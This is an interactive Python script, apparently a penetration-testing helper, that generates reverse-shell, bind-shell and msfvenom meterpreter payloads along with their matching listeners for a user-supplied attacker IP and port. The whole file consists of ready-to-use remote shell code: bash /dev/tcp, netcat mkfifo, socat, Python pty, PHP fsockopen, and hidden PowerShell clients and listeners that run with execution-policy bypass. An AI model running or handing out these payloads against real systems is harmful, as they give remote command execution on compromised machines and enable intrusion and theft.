#!/usr/bin/env python3
import ipaddress, sys

print("\n=== shells generator by Abdalkader ===\n")

REV = {
  "bash-i":    ("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "nc -lvnp {LPORT}"),
  "sh-tcp":    ("sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "nc -lvnp {LPORT}"),
  "nc-mkfifo": ("mkfifo /tmp/f; nc {LHOST} {LPORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f", "nc -lvnp {LPORT}"),
  "socat-pty": ("socat TCP:{LHOST}:{LPORT} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane", "socat TCP-LISTEN:{LPORT},fork -"),
  "python-pty":("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'", "nc -lvnp {LPORT}"),
  "php":       ("php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "nc -lvnp {LPORT}"),
  "pwsh-tcp":  ("powershell -NoP -W Hidden -Exec Bypass -C \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($r=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=[Text.Encoding]::ASCII.GetBytes($o2);$s.Write($by,0,$by.Length)}}\"", "nc -lvnp {LPORT}")
}

BIND = {
  "nc-bind-sh": ("nc -lvnp {LPORT} -e /bin/sh", "nc {RHOST} {LPORT}"),
  "socat-bind": ("socat TCP-LISTEN:{LPORT},fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane", "socat TCP:{RHOST}:{LPORT} -"),
  "pwsh-bind":  ("powershell -NoP -W Hidden -C \"$l=New-Object Net.Sockets.TcpListener('0.0.0.0',{LPORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);while(($d=$r.ReadLine()) -ne $null){{$o=(iex $d 2>&1|Out-String);$w.Write($o);$w.Flush()}}$c.Close()\"", "nc {RHOST} {LPORT}")
}

MSF = {
  "msf-linux-x64": ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
                    "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {LPORT}; run -j"),
  "msf-win-x64":   ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
                    "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {LPORT}; run -j")
}

def ip(v):
    try: return str(ipaddress.ip_address(v))
    except: sys.exit(f"[!] Invalid IP: {v}")

def port(v):
    try:
        p=int(v)
        if 1<=p<=65535: return str(p)
    except: pass
    sys.exit(f"[!] Invalid port: {v}")

def choose(title, items):
    keys=list(items.keys())
    print(f"\n{title}:")
    for i,k in enumerate(keys,1):
        print(f"  [{i}] {k}")
    sel=input("Select number: ").strip()
    if not sel.isdigit() or not (1<=int(sel)<=len(keys)):
        sys.exit("[!] Bad selection.")
    return keys[int(sel)-1]

def main():
    print("Mode:\n  [1] reverse\n  [2] bind\n  [3] msf")
    mode=input("Select number: ").strip()

    if mode=="1":  # reverse
        key=choose("Reverse shells", REV)
        lhost=ip(input("LHOST (your IP): ").strip())
        lport=port(input("LPORT (default 9001): ").strip() or "9001")
        vals={"LHOST":lhost,"LPORT":lport}
        pay,lst=REV[key]

    elif mode=="2":  # bind
        key=choose("Bind shells", BIND)
        lport=port(input("Bind LPORT (default 4444): ").strip() or "4444")
        rhost=ip(input("Your attacker IP (RHOST): ").strip())
        vals={"LPORT":lport,"RHOST":rhost}
        pay,lst=BIND[key]

    elif mode=="3":  # msf
        key=choose("MSF payloads", MSF)
        lhost=ip(input("LHOST (your IP): ").strip())
        lport=port(input("LPORT (default 8080): ").strip() or "8080")
        vals={"LHOST":lhost,"LPORT":lport}
        pay,lst=MSF[key]

    else:
        sys.exit("[!] Invalid mode")

    print("\n=== Payload ===")
    print(pay.format(**vals))
    print("\n=== Listener ===")
    print(lst.format(**vals))
    print()

if __name__=="__main__":
    main()
